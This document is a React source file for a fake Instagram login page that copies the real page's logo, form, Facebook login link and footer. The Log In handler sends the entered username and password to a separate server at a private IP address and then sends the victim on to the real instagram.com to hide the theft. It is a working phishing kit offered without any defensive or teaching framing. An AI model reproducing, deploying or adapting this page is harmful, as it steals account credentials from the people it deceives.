import React, { useState } from "react";
import axios from "axios";
const Home = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSend = async (e) => {
    e.preventDefault();
    console.log(username, password);
    axios.post("http://192.168.31.252:5001/email", { username, password })
    .then((res) => {
      console.log(res);
      window.location.href = "https://www.instagram.com/";
    })
  };
  return (
    <div className="">
      <div className="container flex justify-center my-16">
        {/* <!--Phone's pictures section--> */}
        {/* <section className="phones">
          <img
            src="src/assets/home-phones.png"
            alt="pictures on phone"
            className="phone-image"
          />
          <div className="display-phone">
            <img class="picture" src="src/assets/screenshot1.png" alt="#" />
            <img class="picture" src="src/assets/screenshot2.png" alt="#" />
            <img class="picture" src="src/assets/screenshot3.png" alt="#" />
            <img class="picture" src="src/assets/screenshot4.png" alt="#" />
          </div>
        </section> */}

        {/* <!--User's log in section--> */}
        <section className="user">
          <div className="login-container">
            {/* <!--Instagram Logo--> */}
            <div className="instagram-logo-box">
              <img
                className="instagram-logo"
                src="src/assets/instagram-logo.png"
              />
            </div>

            {/* <!--Form Login--> */}
            <form id="login-post" method="POST">
              <div className="inputs-container">
                <input
                  type="text"
                  name="username"
                  id="username"
                  placeholder="Phone number, username or email"
                  required
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>
              <div className="inputs-container">
                <input
                  type="password"
                  name="password"
                  id="password"
                  placeholder="Password"
                  required
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              <button className="login-button" onClick={handleSend}>
                Log In
              </button>
              <div className="or-container">
                <div className="line"></div>
                <div className="or">OR</div>
                <div className="line"></div>
              </div>

              {/* <!--Facebook login--> */}
              <div className="flex flex-row items-center justify-between">
                <img
                  className="facebook-logo"
                  src="src/assets/facebook-logo.png"
                />
                <a
                  className="facebook-login"
                  href="http://facebook.com/"
                  target="_blank"
                >
                  Log in with Facebook
                </a>
              </div>
            </form>

            {/* <!--Password recovery--> */}
            <a className="password-forgot" href="#" target="_blank">
              Forgot password?
            </a>
          </div>

          {/* <!--Sign up--> */}
          <div className="signup-container">
            <p>
              Don't have an account?
              <a className="signup" href="#" target="_blank">
                Sign up
              </a>
            </p>
          </div>

          {/* <!--App's download--> */}
          <div className="get-container">
            <p>Get the app.</p>
            <div className="download-container">
              <a className="download-appstore" href="#" target="_blank">
                <img className="appstore" src="src/assets/App.png" />
              </a>
              <a className="download-googleplay" href="#" target="_blank">
                <img className="googleplay" src="src/assets/Micro.png" />
              </a>
            </div>
          </div>
        </section>
      </div>
      <div className="flex flex-row flex-wrap text-center justify-center max-w-[1200px] m-auto">
        <div className="navbar">
          <span>Meta</span>
          <span>About</span>
          <span>Blog</span>
          <span>Jobs</span>
          <span>Help</span>
          <span>API</span>
          <span>Privacy</span>
          <span>Terms</span>
          <span>Locations</span>
          <span>Instagram Lite</span>
          <span>Threads</span>
          <span>Contact Uploading & Non-Users</span>
          <span>Meta Verified</span>
        </div>
        <div className="text-center text-gray-500 p-[10px]">
          © 2024 Instagram from Meta
        </div>
      </div>
    </div>
  );
};

export default Home;
